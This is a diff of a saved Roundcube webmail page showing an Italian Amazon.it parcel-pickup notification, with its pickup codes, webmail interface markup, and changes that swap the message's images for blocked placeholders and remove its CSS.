+		<li role="menuitem"><a class="icon active" id="rcmbtn132" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;mark&#39;,&#39;unflagged&#39;,this,event)"><span class="icon unflagged">As unflagged</span></a></li>
+		
+	</ul>
+</div>
+
+</div>
+
+
+<div id="mainscreencontent">
+
+<div id="mailview-left" style="width: 200px;">
+
+<!-- folders list -->
+<div id="mailboxcontainer" class="uibox listbox" role="navigation" aria-labelledby="aria-label-folderlist">
+<h2 id="aria-label-folderlist" class="voice">Email folder selection</h2>
+<div class="scroller">
+<ul id="mailboxlist" class="treelist listing folderlist" role="tree"><li id="rcmliSU5CT1g" class="mailbox inbox selected unread" aria-selected="true" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=INBOX" onclick="return rcmail.command(&#39;list&#39;,&#39;INBOX&#39;,this,event)" rel="INBOX">Inbox<span class="unreadcount skip-content">6</span></a>
+</li>
+<li id="rcmliRHJhZnRz" class="mailbox drafts" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=Drafts" onclick="return rcmail.command(&#39;list&#39;,&#39;Drafts&#39;,this,event)" rel="Drafts">Drafts</a>
+</li>
+<li id="rcmliU2VudA" class="mailbox sent" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=Sent" onclick="return rcmail.command(&#39;list&#39;,&#39;Sent&#39;,this,event)" rel="Sent">Sent</a>
+</li>
+<li id="rcmliSnVuaw" class="mailbox junk" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=Junk" onclick="return rcmail.command(&#39;list&#39;,&#39;Junk&#39;,this,event)" rel="Junk">Junk</a>
+</li>
+<li id="rcmliVHJhc2g" class="mailbox trash" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=Trash" onclick="return rcmail.command(&#39;list&#39;,&#39;Trash&#39;,this,event)" rel="Trash">Trash</a>
+</li>
+<li id="rcmliTjI2" class="mailbox" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=N26" onclick="return rcmail.command(&#39;list&#39;,&#39;N26&#39;,this,event)" rel="N26">N26</a>
+</li>
+<li id="rcmliUGVyc28" class="mailbox" role="treeitem" aria-level="1"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_mbox=Perso" onclick="return rcmail.command(&#39;list&#39;,&#39;Perso&#39;,this,event)" rel="Perso">Perso</a>
+</li>
+</ul>
+
+</div>
+</div>
+
+</div>
+
+<div id="mailview-right" class="uibox" role="main" style="left: 212px;">
+
+
+<div id="messageheader">
+<span class="moreheaderstoggle"></span>
+
+<!-- record navigation -->
+<div id="countcontrols" class="pagenav" role="navigation" aria-labelledby="aria-label-countcontrols">
+	<h2 id="aria-label-countcontrols" class="voice">Message navigation</h2>
+	<span class="countdisplay" id="rcmcountdisplay">Message 1 of 16</span>
+	<a class="button prevpage disabled" title="Show previous message" id="rcmbtn133" role="button" tabindex="-1" aria-disabled="true" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;previousmessage&#39;,&#39;&#39;,this,event)"><span class="inner">Previous</span></a>
+	<a class="button nextpage" title="Show next message" id="rcmbtn134" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;nextmessage&#39;,&#39;&#39;,this,event)"><span class="inner">Next</span></a>
+</div>
+
+<div id="formatcontrols">
+	<span class="buttongroup">
+		<a class="button first changeformat html selected" title="Display in HTML format" id="rcmbtn135" role="button" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;change-format&#39;,&#39;html&#39;,this,event)" tabindex="0" aria-disabled="false"><span class="icon">change-format</span></a><a class="button last changeformat text" title="Display in plain text format" id="rcmbtn136" role="button" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;change-format&#39;,&#39;text&#39;,this,event)" tabindex="0" aria-disabled="false"><span class="icon">change-format</span></a>
+	</span>
+</div>
+
+
+<h2 class="subject"><span class="flag-icon"></span><span onmouseover="rcube_webmail.long_subject_title(this)"><span class="voice">Subject: </span>Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 7 gennaio</span></h2>
+<div class="message-headers">
+<table class="headers-table"><tbody><tr><td class="header-title">From</td>
+<td class="header from"><span class="adr"><a href="mailto:order-update@amazon.it" class="rcmContactAddress" onclick="return rcmail.command(&#39;compose&#39;,&#39;\&quot;Amazon.it\&quot; &lt;order-update@amazon.it&gt;&#39;,this)" title="order-update@amazon.it">Amazon.it</a><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#add" title="Add to address book" class="rcmaddcontact" onclick="return rcmail.command(&#39;add-contact&#39;,&#39;\&quot;Amazon.it\&quot; &lt;order-update@amazon.it&gt;&#39;,this)"><img src="./qwe_files/addcontact.png" alt="Add to address book" class="noselect"></a></span></td>
 </tr>
 <tr><td class="header-title">To</td>
-<td class="header to"><span class="adr"> &lt;christophe.thiebaud@alumni.insead.edu&gt;</span></td>
+<td class="header to"><span class="adr"><a href="mailto:christophe.thiebaud@alumni.insead.edu" class="rcmContactAddress" onclick="return rcmail.command(&#39;compose&#39;,&#39;christophe.thiebaud@alumni.insead.edu&#39;,this)" title="christophe.thiebaud@alumni.insead.edu">christophe.thiebaud@alumni.insead.edu</a><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#add" title="Add to address book" class="rcmaddcontact" onclick="return rcmail.command(&#39;add-contact&#39;,&#39;christophe.thiebaud@alumni.insead.edu&#39;,this)"><img src="./qwe_files/addcontact.png" alt="Add to address book" class="noselect"></a></span></td>
 </tr>
 <tr><td class="header-title">Reply-To</td>
-<td class="header replyto"><span class="adr"> &lt;no-reply@amazon.it&gt;</span></td>
+<td class="header replyto"><span class="adr"><a href="mailto:no-reply@amazon.it" class="rcmContactAddress" onclick="return rcmail.command(&#39;compose&#39;,&#39;no-reply@amazon.it&#39;,this)" title="no-reply@amazon.it">no-reply@amazon.it</a><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#add" title="Add to address book" class="rcmaddcontact" onclick="return rcmail.command(&#39;add-contact&#39;,&#39;no-reply@amazon.it&#39;,this)"><img src="./qwe_files/addcontact.png" alt="Add to address book" class="noselect"></a></span></td>
 </tr>
 <tr><td class="header-title">Date</td>
-<td class="header date">2020-12-24 12:49</td>
+<td class="header date">Mon 11:25</td>
 </tr>
 </tbody>
 </table>
 
+</div>
+<div id="full-headers"><div id="all-headers" class="all" style="display:none"><div id="headers-source"></div></div>
+<div class="more-headers show-headers" onclick="return rcmail.command(&#39;show-headers&#39;,&#39;&#39;,this)" title="Toggle raw message headers"></div></div>
+
+
+<div id="contactphoto"><img src="./qwe_files/saved_resource" alt="Contact photo" onerror="this.src = &#39;program/resources/blank.gif&#39;; this.onerror = null"></div>
+</div>
+
+<div id="messagecontent" style="top: 108px;">
+<div class="rightcol" role="region" aria-labelledby="aria-label-messageattachments" aria-hidden="true" style="display: none;">
+<h2 id="aria-label-messageattachments" class="voice">Attachments</h2>
+
+</div>
+<div class="leftcol" role="region" aria-labelledby="aria-label-messagebody" style="margin-right: 0px;">
+<h2 id="aria-label-messagebody" class="voice">Message Body</h2>
+<div id="message-objects">
+<div id="remote-objects-message" class="notice" style=""><span>To protect your privacy remote resources have been blocked.</span>&nbsp;<span class="boxbuttons"><a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#loadremote" onclick="rcmail.command(&#39;load-remote&#39;)" class="button">Allow</a></span></div>
+</div>
 
 <div id="messagebody"><div class="message-htmlpart" id="message-htmlpart1"><!-- html ignored --><!-- head ignored --><!-- meta ignored --> 
    
@@ -69,315 +310,15 @@ rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerro
   <!-- meta ignored --> 
   <!-- meta ignored --> 
    
-  <style type="text/css">#message-htmlpart1 div.rcmBody { width:100% !important;
- height:100% !important;
- margin:0;
- padding:0;
- }
-    #message-htmlpart1 div.rcmBody table, #message-htmlpart1 div.rcmBody table td { border-collapse:collapse !important;
- }
-    #message-htmlpart1 div.rcmBody table th { margin:0 !important;
- padding:0 !important;
- font-weight:normal;
- }
-
-    
-    #message-htmlpart1 div.rcmBody, #message-htmlpart1 div.rcmBody table, #message-htmlpart1 div.rcmBody td, #message-htmlpart1 div.rcmBody a {  -webkit-text-size-adjust:100%;
- -ms-text-size-adjust:100%;
- }
-    
-    #message-htmlpart1 div.rcmBody .v1ReadMsgBody { width:100%;
- } #message-htmlpart1 div.rcmBody .v1ExternalClass { width:100%;
- }
-    
-    #message-htmlpart1 div.rcmBody .v1ExternalClass { width:100%;
- }
-    
-    #message-htmlpart1 div.rcmBody .v1ExternalClass, #message-htmlpart1 div.rcmBody .v1ExternalClass p, #message-htmlpart1 div.rcmBody .v1ExternalClass span, #message-htmlpart1 div.rcmBody .v1ExternalClass font, #message-htmlpart1 div.rcmBody .v1ExternalClass td, #message-htmlpart1 div.rcmBody .v1ExternalClass div { line-height: 100%;
- }
-
-    
-    #message-htmlpart1 div.rcmBody h1 {display:block;
- font-size:26px;
- font-style:normal;
- font-weight:normal;
- line-height:100%}
-    #message-htmlpart1 div.rcmBody h2 {display:block;
- font-size:20px;
- font-style:normal;
- font-weight:normal;
- line-height:120%}
-    #message-htmlpart1 div.rcmBody h3 {display:block;
- font-size:16px;
- font-style:normal;
- font-weight:normal;
- line-height:110%}
-    #message-htmlpart1 div.rcmBody h4 {display:block;
- font-size:18px;
- font-style:italic;
- font-weight:normal;
- line-height:100%}
-
-    
-    #message-htmlpart1 div.rcmBody .v1appleBody a { color:#68440a;
- text-decoration: none;
- }
-    #message-htmlpart1 div.rcmBody .v1appleFooter a { color:#999999;
- text-decoration: none;
- }
-
-    
-
-    #message-htmlpart1 div.rcmBody .v1a[href^="tel"], #message-htmlpart1 div.rcmBody a[href^="sms"] {text-decoration:none!important;
-color:#606060!important;
-pointer-events:none!important;
-cursor:default!important}
-    #message-htmlpart1 div.rcmBody .v1mobile_link a[href^="tel"], #message-htmlpart1 div.rcmBody .v1mobile_link a[href^="sms"] {text-decoration:none!important;
-color:#606060!important;
-pointer-events:auto!important;
-cursor:default!important}
-
-    @media only screen and (max-width: 680px){
-        #message-htmlpart1 div.rcmBody *[class].v1deviceWidth { width:100% !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1container { width:90% !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width_75 { width:75% !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1maxwidth200 { max-width:200px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1full { width:100% !important;
- }
-    }
-
-    @media only screen and (max-width: 620px){
-        #message-htmlpart1 div.rcmBody *[class].v1farm { display:none !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1height140 { height:140px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1full { width:100% !important;
- }
-    }
-
-    @media screen and (max-width: 480px){
-
-        
-        #message-htmlpart1 div.rcmBody *[class].v1hide { display:none !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1tdwrap { display:inline-block !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1block_wrap { display:block !important;
- padding:0 !important;
- margin:0 !important}
-        #message-htmlpart1 div.rcmBody *[class].v1block { display:block !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1valignbottom { vertical-align:bottom !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1valigncenter { vertical-align:middle !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1rel { position:relative !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1abs { position:absolute !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1show { display:block !important;
- width:auto !important;
- overflow:visible !important;
- float:none !important;
- max-height:inherit !important;
- line-height:inherit !important;
- }
-        #message-htmlpart1 div.rcmBody img[class="img-max"] { width:100% !important;
- height:auto !important;
- }
-
-        #message-htmlpart1 div.rcmBody *[class].v1bgHero {/* evil! */}
-
-        #message-htmlpart1 div.rcmBody *[class].v1bgefefef { background-color:#efefef !important;
- }
-
-        #message-htmlpart1 div.rcmBody *[class].v1marginr66 { margin-right:66px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1marginl0 { margin-left:0px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1marginl66 { margin-left:66px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font10{ font-size:10px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font11{ font-size:11px !important;
- line-height:11px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font12{ font-size:12px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font13{ font-size:13px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font14{ font-size:14px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font16{ font-size:16px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font20{ font-size:20px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1font21{ font-size:21px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1lineh16{ line-height:16px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1line16{ font-size:16px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1line17{ font-size:17px !important;
- }
-
-        
-        #message-htmlpart1 div.rcmBody *[class].v1full { width:100% !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1deviceWidth { width:320px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width100 { width:100px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width300 { width:300px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width320 { width:320px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width_50 { width:50% !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1width_90 { width:90% !important;
- }
-
-        
-        #message-htmlpart1 div.rcmBody *[class].v1hauto { height:auto !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1height0 { height:0px !important;
- }
-
-        
-        #message-htmlpart1 div.rcmBody *[class].v1paddingt10 { padding-top:10px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingr0 {padding-right:0px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingr10 {padding-right:10px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingr20 {padding-right:20px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingb5 { padding-bottom:5px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingb10 { padding-bottom:10px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingb20 { padding-bottom:20px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingl0 {padding-left:0px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingl10 {padding-left:10px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddingl20 {padding-left:20px !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1paddinglr60 {padding-left:60px !important;
- padding-right:60px !important;
- }
-
-        
-        #message-htmlpart1 div.rcmBody *[class].v1fl { float:left !important;
-    }
-        #message-htmlpart1 div.rcmBody *[class].v1fr { float:right !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1wrap { float:block !important;
- }
-        #message-htmlpart1 div.rcmBody *[class].v1clear { clear:both !important;
- }
-
-    }
-    @media screen and (device-width: 768px) and (device-height: 1024px) {
-        #message-htmlpart1 div.rcmBody {min-width: 701px !important}
-    }
-
-    #message-htmlpart1 div.rcmBody .v1amazonImageWidth { width: 110px;
- }
-    #message-htmlpart1 div.rcmBody .v1smileImageWidth { width:200px;
- }
-    #message-htmlpart1 div.rcmBody .v1conditionalCenter { text-align:left !important;
- }
-
-    @media screen and (min-width: 651px) {
-        #message-htmlpart1 div.rcmBody .v1consolidationTextAlignment { display: inline !important;
- }
-        #message-htmlpart1 div.rcmBody .v1desktopDontShiftIconLeft { margin-left: 0px;
- }
-        #message-htmlpart1 div.rcmBody .v1amazonImageWidth { width: 135px;
- }
-        #message-htmlpart1 div.rcmBody .v1emailBody {
-            width: 640px !important;
-            text-align:center !important;
-        }
-        #message-htmlpart1 div.rcmBody .v1greetingAndEta { width: 317px !important;
- max-width: 317px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1container { width: 530px !important;
- max-width: 530px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1trackPackageButton { width: 317px !important;
- max-width: 317px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1conditionalCenter { text-align:center !important;
- }
-        #message-htmlpart1 div.rcmBody .v1greetingText { text-align:center !important;
- }
-        #message-htmlpart1 div.rcmBody .v1consolidationText { font-size: 14px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1disclaimerText { font-size: 9px !important;
- width:400px !important;
- max-width:400px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1amazonImage { width: 135px !important;
- height: 39px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1informationText { font-size: 16px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1addressText { font-size: 15px !important;
- }
-        #message-htmlpart1 div.rcmBody .v1marketingContent { width: 400px !important;
- max-width: 400px !important;
- }
-
-        #message-htmlpart1 div.rcmBody .v1p13n-te-widget-title {
-            font-size: 13px !important;
-        }
-        #message-htmlpart1 div.rcmBody .v1p13n-te-asin-image img {
-            max-height: 127px !important
-        }
-        #message-htmlpart1 div.rcmBody .v1p13n-te-widget-recs {
-            margin-bottom: 24px !important
-        }
-        #message-htmlpart1 div.rcmBody .v1p13n-te-asin-cell:first-child {
-            padding-right: 69px !important
-        }
-    }
-    
-    #message-htmlpart1 div.rcmBody .v1p13n-te-widget-title {
-        margin-left: 10px;
-        font-size: 15px;
-        line-height: 16px;
-    }
-    #message-htmlpart1 div.rcmBody .v1p13n-te-asin-image img {
-        max-height: 116px;
-        width: auto
-    }
-    #message-htmlpart1 div.rcmBody .v1p13n-te-widget-recs {
-        margin-bottom: 25px
-    }
-    #message-htmlpart1 div.rcmBody .v1p13n-te-asin-cell {
-        padding: 6px 6px 0 16px
-    }
-    #message-htmlpart1 div.rcmBody .v1p13n-te-asin-cell:first-child {
-        padding-right: 56px
-    }</style>
- 
+   
    
   <style type="text/css">#message-htmlpart1 div.rcmBody .v1arrivalDate a {
-        color: #008a00;
- !important;
-        text-decoration: none;
- !important;
+        color: #008a00; !important;
+        text-decoration: none; !important;
     }</style>
  
   
- <div class="rcmBody" style="-webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; margin: 0 auto; background: #ffffff"><img width="1" height="1" src="./qwe_files/r.html"> 
+ <div class="rcmBody" style="-webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; margin: 0 auto; background: #ffffff"><img width="1" height="1" src="./qwe_files/blocked.gif"> 
   <table id="v1emailBodyOuter" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 100%" dir="ltr"> 
    <tbody>
     <tr valign="top"> 
@@ -386,19 +327,19 @@ cursor:default!important}
       <table style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 375px; background-color: #fafafa" class="v1emailBody"> 
        <tbody>
         <tr> 
-         <td align="center" class="v1emailWidth"> <a href="https://www.amazon.it/gp/f.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:202012241149359e4991f2f1ef40fda2f9a44b4750p0eu&amp;R=2957UF533PLC2&amp;T=C&amp;U=&amp;H=MK1EADSONWUJJPOEIVYASFPZVYGA" style="text-decoration: none" target="_blank" rel="noreferrer">
+         <td align="center" class="v1emailWidth"> <a href="https://www.amazon.it/gp/f.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:20201228102510e8daf99856934a99877660f09b20p0eu&amp;R=1RX7MI3BRJDWG&amp;T=C&amp;U=&amp;H=JARADAJUD2FJ2JEIC6AJLZBBLYSA" style="text-decoration: none" target="_blank" rel="noreferrer">
            <table style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 340px" class="v1container"> 
             <tbody>
              <tr> 
-              <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/sp.gif" width="1" height="22" style="display: block; border: none"> </td> 
+              <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/blocked.gif" width="1" height="22" style="display: block; border: none"> </td> 
              </tr> 
              <tr class="v1containerWidth"> 
               <td align="center" class="v1brandImage"> 
-                <img src="./qwe_files/logo.png" width="110" alt="Amazon.com" border="0" style="display: block; border: none" class="v1amazonImageWidth"> 
+                <img src="./qwe_files/blocked.gif" width="110" alt="Amazon.com" border="0" style="display: block; border: none" class="v1amazonImageWidth"> 
                 </td> 
              </tr> 
              <tr> 
-              <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/sp.gif" width="1" height="22" style="display: block; border: none"> </td> 
+              <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/blocked.gif" width="1" height="22" style="display: block; border: none"> </td> 
              </tr> 
             </tbody>
            </table> </a>
@@ -409,7 +350,7 @@ cursor:default!important}
               <table style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center" class="v1innerContainer"> 
                <tbody>
                 <tr> 
-                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/sp.gif" width="1" height="29" style="display: block; border: none"> </td> 
+                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/blocked.gif" width="1" height="29" style="display: block; border: none"> </td> 
                 </tr> 
                </tbody>
               </table> 
@@ -430,7 +371,7 @@ cursor:default!important}
                   </table></td> 
                 </tr> 
                 <tr> 
-                 <td height="0" style="min-width: 1; line-height: 0px"> <img src="./qwe_files/sp.gif" width="1" height="0" style="display: block; border: none"> </td> 
+                 <td height="0" style="min-width: 1; line-height: 0px"> <img src="./qwe_files/blocked.gif" width="1" height="0" style="display: block; border: none"> </td> 
                 </tr> 
                </tbody>
               </table> 
@@ -440,70 +381,70 @@ cursor:default!important}
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px"> Ciao Christophe, </td> 
                 </tr> 
                 <tr> 
-                 <td height="20" style="min-width: 1; line-height: 20px"> <img src="./qwe_files/sp.gif" width="1" height="20" style="display: block; border: none"> </td> 
+                 <td height="20" style="min-width: 1; line-height: 20px"> <img src="./qwe_files/blocked.gif" width="1" height="20" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> Il tuo pacco con 5 articoli è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> Il tuo pacco con 1 articolo è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. </td> 
                 </tr> 
                 <tr> 
-                 <td height="20" style="min-width: 1; line-height: 20px"> <img src="./qwe_files/sp.gif" width="1" height="20" style="display: block; border: none"> </td> 
+                 <td height="20" style="min-width: 1; line-height: 20px"> <img src="./qwe_files/blocked.gif" width="1" height="20" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; text-align: center; background: #ffffff !important"> <img id="v1barcode-img" style="display: block; margin: auto" src="./qwe_files/blank003._ZXcc514b563152527cce,0,0,0,0,advc128d,30,0,0,0_AC_SCLZZZZZZZ_.jpg"> </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; text-align: center; background: #ffffff !important"> <img id="v1barcode-img" style="display: block; margin: auto" src="./qwe_files/blocked.gif"> </td> 
                 </tr> 
                 <tr> 
-                 <td style="min-width: 1; line-height: px"> <img src="./qwe_files/sp.gif" width="1" style="display: block; border: none"> </td> 
+                 <td style="min-width: 1; line-height: px"> <img src="./qwe_files/blocked.gif" width="1" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; line-height: 18px; letter-spacing: -.5px; text-align: center"> Utilizza questo codice per ritirare il tuo pacco </td> 
                 </tr> 
                 <tr> 
-                 <td height="42" style="min-width: 1; line-height: 42px"> <img src="./qwe_files/sp.gif" width="1" height="42" style="display: block; border: none"> </td> 
+                 <td height="42" style="min-width: 1; line-height: 42px"> <img src="./qwe_files/blocked.gif" width="1" height="42" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> Il tuo codice di ritiro è <b>QKV1RR</b> </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> Il tuo codice di ritiro è <b>D8UCTK</b> </td> 
                 </tr> 
                 <tr> 
-                 <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/sp.gif" width="1" height="22" style="display: block; border: none"> </td> 
+                 <td height="22" style="min-width: 1; line-height: 22px"> <img src="./qwe_files/blocked.gif" width="1" height="22" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; text-align: left"> Alla luce dell'evoluzione della situazione relativa alla COVID-19, quando ritiri il pacco lavati le mani accuratamente dopo il viaggio ed evita di toccarti il viso e la bocca. Per le ultime indicazioni relative alla COVID-19, visita il sito web dell'Organizzazione Mondiale della Sanità a questo indirizzo: https://www.who.int/emergencies/diseases/novel-coronavirus-2019.<br> </td> 
                 </tr> 
                 <tr> 
-                 <td style="min-width: 1; line-height: px"> <img src="./qwe_files/sp.gif" width="1" style="display: block; border: none"> </td> 
+                 <td style="min-width: 1; line-height: px"> <img src="./qwe_files/blocked.gif" width="1" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 16px; line-height: 16px; line-height: 18px; letter-spacing: 0.5px; text-align: left"> Di seguito alcuni suggerimenti per una scansione efficace: <li>Modificare la luminosità dello schermo del telefono portandola al massimo.</li> <li>Assicurarsi che lo schermo del telefono sia pulito prima della scansione.</li> </td> 
                 </tr> 
                 <tr> 
-                 <td height="42" style="min-width: 1; line-height: 42px"> <img src="./qwe_files/sp.gif" width="1" height="42" style="display: block; border: none"> </td> 
+                 <td height="42" style="min-width: 1; line-height: 42px"> <img src="./qwe_files/blocked.gif" width="1" height="42" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr>
                  <td> 
                   <table class="v1InfoBlock" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 296px; max-width: 296px"> 
                    <tbody>
                     <tr> 
-                     <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/clock.png" alt="delivery" width="36" style="display: block; border: none"> </td> 
+                     <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/blocked.gif" alt="delivery" width="36" style="display: block; border: none"> </td> 
                      <td align="left" valign="top"> 
                       <table class="v1InfoBlockInner" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 100%; max-width: 100%"> 
                        <tbody>
                         <tr> 
-                         <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/sp.gif" width="1" height="3" style="display: block; border: none"> </td> 
+                         <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/blocked.gif" width="1" height="3" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; font-weight: bold"> RITIRA ENTRO IL </td> 
                         </tr> 
                         <tr> 
-                         <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/sp.gif" width="1" height="8" style="display: block; border: none"> </td> 
+                         <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/blocked.gif" width="1" height="8" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                           
                           
